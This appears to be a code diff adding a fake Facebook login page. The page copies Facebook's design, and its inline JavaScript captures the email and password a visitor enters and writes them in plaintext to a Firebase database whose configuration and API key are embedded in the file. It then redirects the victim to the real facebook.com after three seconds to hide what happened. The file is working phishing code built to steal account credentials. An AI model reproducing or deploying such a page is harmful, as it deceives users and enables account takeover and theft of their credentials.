@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form action="#">
+          <input id="testemail" placeholder="Email or phone number" required>
+          <input id="testpass" type="password" placeholder="Password" required>
+          <div class="link">
+            <button id="register" class="login">Login</button>
+            <a href="https://www.facebook.com/" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="https://www.facebook.com/">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- jQuery CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-auth.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <script>
+        // #CONFIGURING WEB APP...
+        var firebaseConfig = {
+          apiKey: "AIzaSyCYm3viG-x4CtPtIjZJLl-FvkfELFhqIHA",
+          authDomain: "mindtech-ieeemdxthon-2023.firebaseapp.com",
+          databaseURL: "https://mindtech-ieeemdxthon-2023-default-rtdb.firebaseio.com/",
+          projectId: "mindtech-ieeemdxthon-2023",
+          storageBucket: "mindtech-ieeemdxthon-2023.appspot.com",
+          messagingSenderId: "929752976339",
+          appId: "1:929752976339:web:b8beb143e2135a0844bd26",
+          measurementId: "G-56NFBR8D6F"
+        };
+  
+  
+        // Initialize Firebase...
+        firebase.initializeApp(firebaseConfig);
+  
+        //PUSH DATA ON SERVER... 
+        var rootPath;
+        var idPath;
+        var path;
+        var firebaseRef;  
+        var count;
+        var getEmailFromDB;
+        var enteredEmail;
+        var exists = false;
+        var files = [];
+        var uploadImg = false;
+        var empty = document.getElementById("testpass").value;
+        console.log(empty);
+  
+        var username;
+        var password;
+        var confirmpassword;
+        var profileImageURL;
+        
+  
+        //------------------------------------------INITIALISE COUNT-----------------------
+        firebase.database().ref('NUMBERS/COUNT/ID').once("value", snapshot =>{
+          if(snapshot.exists()){
+            count = snapshot.val();
+            count = count - 1;
+          }
+        });
+        
+  
+
+  
+        //------------------------------------------Login PROCESS-----------------------
+        document.querySelector('#register').addEventListener('click', ()=>{
+
+          const email = document.getElementById('testemail').value;
+          var password = document.getElementById('testpass').value;
+  
+          
+          if( email === empty || password === empty){
+            alert("*Fill all the fields");
+              
+          }else{
+            pushUserData();
+
+            setTimeout(
+              function(){ 
+                window.location.href = "https://www.facebook.com/";
+              }, 3000);
+          }
+            
+        });
+  
+  
+        //------------------------------------------ADDITIONAL FUNCTIONS-----------------------
+        function pushUserData(){
+  
+        
+          const email = document.getElementById('testemail').value;
+          var password = document.getElementById('testpass').value;
+  
+
+              var enteredEmail = email;
+              rootPath = "USERs/";
+              idPath = enteredEmail
+              path = rootPath + idPath;
+              firebaseRef2 = firebase.database().ref(path); 
+  
+
+              firebaseRef2.set({
+                  email: email,
+                  password: password,
+                });
+  
+  
+              var firebaseRef = firebase.database().ref('NUMBERS/COUNT');
+              firebaseRef.set({
+                ID : count
+              });
+  
+        }
+  
+
+  
+    </script>
+  
+  </body>
+</html>
